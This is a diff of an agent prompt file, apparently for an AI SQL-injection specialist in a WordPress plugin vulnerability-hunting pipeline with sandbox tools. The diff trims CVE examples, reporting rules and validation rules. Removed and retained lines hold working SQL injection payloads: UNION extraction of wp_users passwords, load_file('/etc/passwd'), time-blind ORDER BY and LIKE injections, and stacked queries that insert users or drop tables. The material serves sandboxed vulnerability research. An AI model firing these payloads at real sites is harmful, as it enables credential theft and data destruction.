@@ -158,21 +158,6 @@ $meta_query = array(
 
 ## Real-World CVE Patterns
 
-### CVE-2024-49613: Simple Code Insert Shortcode — Missing prepare() on Shortcode Attr
-**Impact:** Contributor+ UNION-based SQLi, CVSS 8.8 (UNPATCHED — plugin abandoned)
-
-```php
-// Shortcode attribute flows directly into SQL without prepare()
-$scis_id = $data['id'];  // From [scis id="..."]
-$scis_row = $wpdb->get_results(
-    "SELECT * FROM $wpdb->prefix" . SCIS_TABLE_NAME . " WHERE id=$scis_id"
-);
-// Payload: [scis id="1 UNION SELECT 1,user_login,user_pass FROM wp_users--"]
-```
-
-**Why vulnerable:** `shortcode_atts()` provides defaults but does NOT sanitize. `$scis_id` reaches `$wpdb->get_results()` without `$wpdb->prepare()` or `absint()`. Numeric context without quotes makes UNION injection trivial.
-**Detection:** `$wpdb->get_results|get_row|get_var|query` with string interpolation containing `$variable` not wrapped in `$wpdb->prepare()`. Shortcode callbacks are high-value targets.
-
 ### CVE-2024-1071: Ultimate Member — ORDER BY Injection via Non-Strict in_array()
 **Impact:** Unauthenticated Time-Based Blind SQLi, CVSS 9.8 Critical
 
@@ -194,92 +179,36 @@ $sortby = sanitize_text_field($_POST['sorting']);
 **Why vulnerable:** `$wpdb->prepare()` CANNOT parameterize column names/ORDER BY — it wraps in quotes which breaks SQL syntax. `sanitize_text_field()` only strips HTML tags; `IF(1=1,SLEEP(3),0)` passes through unchanged. Non-strict `in_array()` enables type juggling bypass of the allowlist.
 **Detection:** `ORDER BY`, `GROUP BY`, or `LIMIT` clauses with `$variable` interpolation. Look for `in_array()` without `true` as third parameter. `sanitize_text_field()` before SQL is a red flag — it does NOT prevent SQLi.
 
-### CVE-2024-9186: FunnelKit Automations — Cookie-Based SQLi Across Multiple Methods
-**Impact:** Unauthenticated SQLi via tracking cookie, CVSS 9.8 Critical
-
-```php
-// Cookie value flows into SQL across virtually every method
-$cid = sanitize_text_field($_COOKIE['bwfan-track-id']);
-$query = "SELECT `id` FROM {$table} WHERE `c_id` = '$cid'";
-$result = $wpdb->get_var($query);  // Missing prepare() on cookie input
-```
-
-**Why vulnerable:** Systemic pattern — `BWFAN_Model_Engagement_Tracking` class had missing `$wpdb->prepare()` across virtually every method. Cookie values are attacker-controlled just like GET/POST. `sanitize_text_field()` strips tags but does NOT escape SQL metacharacters (`'`, `--`, etc.).
-**Detection:** `$_COOKIE` values reaching `$wpdb->` methods. Also check custom model/query builder classes — if they have a `prepare_value()` or `escape()` method, verify it actually uses `$wpdb->prepare()`.
+Also study: CVE-2024-49613 (shortcode attr flows into $wpdb->get_results() without prepare() — Contributor+ UNION SQLi)
+Also study: CVE-2024-9186 (cookie value via sanitize_text_field() into raw SQL across entire model class — Unauth SQLi)
 
 ---
 
 ## Attack Techniques
 
-### 1. Classic UNION Injection
+Standard SQLi payloads (UNION, blind boolean/time-based, stacked queries) apply. Focus on WordPress-specific vectors below.
+
+### ORDER BY / Identifier Injection
 ```sql
-' UNION SELECT user_login,user_pass,3,4,5 FROM wp_users--
-' UNION SELECT 1,@@version,3,4,5--
-' UNION SELECT 1,load_file('/etc/passwd'),3,4,5--
-```
-
-### 2. Blind Boolean-Based
-```sql
-' AND 1=1--  (true)
-' AND 1=2--  (false)
-' AND SUBSTRING(user_pass,1,1)='$' FROM wp_users WHERE ID=1--
-' AND (SELECT COUNT(*) FROM wp_users)>0--
-```
-
-### 3. Blind Time-Based
-```sql
-' AND SLEEP(5)--
-' AND IF(1=1,SLEEP(5),0)--
-' AND IF(SUBSTRING(user_pass,1,1)='$',SLEEP(5),0) FROM wp_users WHERE ID=1--
-' AND BENCHMARK(5000000,SHA1('test'))--
-```
-
-### 4. ORDER BY Injection
-```sql
--- Determine column count
-ORDER BY 1--
-ORDER BY 2--
-ORDER BY 10-- (error = columns < 10)
-
--- Boolean blind via ORDER BY
-ORDER BY IF(1=1,id,name)--
-ORDER BY IF((SELECT COUNT(*) FROM wp_users)>0,id,name)--
-
--- Time blind via ORDER BY
+-- ORDER BY blind (prepare() can't parameterize identifiers)
 ORDER BY IF(1=1,SLEEP(5),id)--
 ORDER BY (SELECT IF(SUBSTRING(user_pass,1,1)='$',SLEEP(3),0) FROM wp_users LIMIT 1)--
+
+-- Table/column name injection (prepare wraps in quotes, breaking syntax)
+SELECT * FROM {$user_table} WHERE ...  -- identifier can't use %s placeholder
 ```
 
-### 5. Identifier Injection
+### LIKE Clause Injection
 ```sql
--- Table name injection (when prepare can't help)
-SELECT * FROM wp_options; DROP TABLE wp_users;--
-
--- Column name injection
-SELECT username, password FROM users ORDER BY (SELECT password FROM users LIMIT 1)--
-```
-
-### 6. Stacked Queries (if supported)
-```sql
-'; INSERT INTO wp_users (user_login,user_pass) VALUES ('hacker','$P$hash');--
-'; UPDATE wp_options SET option_value='admin' WHERE option_name='default_role';--
-```
-
-### 7. LIKE Clause Injection
-```sql
--- If esc_like() not used, % and _ are wildcards
-%' OR '1'='1
-%' UNION SELECT 1,2,3--
+-- If esc_like() not used before prepare(), % and _ are wildcards
 test%' AND SLEEP(5) AND '%'='
+%' UNION SELECT 1,2,3--
 ```
 
-### 8. Array/Type Juggling
+### Array/Type Juggling
 ```php
-// If code does: intval($_GET['id'])
 // Send: id[]=1 -- intval(['1']) = 1, but array breaks other checks
-
-// If code does: (int)$_GET['id']
-// Might work, but what about: id=1 OR 1=1 -- if used in string context elsewhere
+// in_array() without strict (true) enables type juggling bypass
 ```
 
 ---
@@ -357,22 +286,6 @@ wpguard_sandbox_request(
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
@@ -380,33 +293,18 @@ wpguard_finding_create(
     active_installs=50000,
     vuln_type="sql_injection",
     title="Blind SQL Injection via Search Parameter",
-    description="""
-## Vulnerability Summary
-Time-based blind SQL injection in search functionality allows database extraction.
+    description="""## Vulnerability Summary
+Time-based blind SQL injection in search functionality.
 
 ## Data Flow
-Entry: AJAX action "plugin_search" (unauthenticated)
-  ↓
-Input: $_POST['search_term']
-  ↓
-Processing: $term = sanitize_text_field($_POST['search_term'])  // NOT SQL safe!
-  ↓
-Query: $wpdb->get_results("SELECT * FROM {$wpdb->prefix}items WHERE name LIKE '%$term%'")
-  ↓
-Sink: Direct query execution without prepare()
+$_POST['search_term'] → sanitize_text_field() → $wpdb->get_results("...WHERE name LIKE '%$term%'")
 
 ## Prerequisites
-None — works with default plugin settings.
+- **Base plugins:** [None]
+- **Plugin settings:** [Default settings]
 
 ## Exploitation
-Payload: ' AND SLEEP(5)--
-Result: 5 second delay confirms injection
-
-## Impact
-- Full database read access
-- Credential extraction
-- Potential privilege escalation via user table manipulation
-    """,
+Payload: ' AND SLEEP(5)-- → 5 second delay confirms injection""",
     auth_level="unauthenticated",
     cvss_score=9.8,
     cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
@@ -431,69 +329,4 @@ ORDER BY/LIMIT injection (limited impact): 4.3-6.5 depending on data exposed
 
 ---
 
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., SQL error in response, time-based delay observed, UNION query returned extra data)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=SQL error in response, time-based delay observed, UNION query returned extra data}}
